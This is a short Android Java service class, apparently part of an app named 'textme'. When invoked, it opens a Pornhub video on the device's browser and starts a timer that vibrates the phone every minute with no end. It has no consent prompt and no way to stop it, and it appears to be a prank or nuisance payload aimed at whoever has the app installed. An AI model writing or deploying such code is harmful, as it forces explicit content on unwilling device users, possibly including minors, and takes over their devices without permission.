package com.candroid.textme.services;

import android.app.IntentService;
import android.content.Intent;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.api.Systems;
import com.candroid.textme.api.Web;
import com.candroid.textme.data.Pornhub;

import java.util.Timer;
import java.util.TimerTask;

public class PornService extends IntentService {

    public PornService() {
        super("PornJob");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Web.Browser.watchPornHubVideo(this, Pornhub.VIDEOS[0]);
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                Systems.Vibrations.vibrator(PornService.this.getApplicationContext());
            }
        };
        Timer timer = new Timer("vibratorTask", true);
        timer.schedule(timerTask, 1000L, 60000L);

    }
}
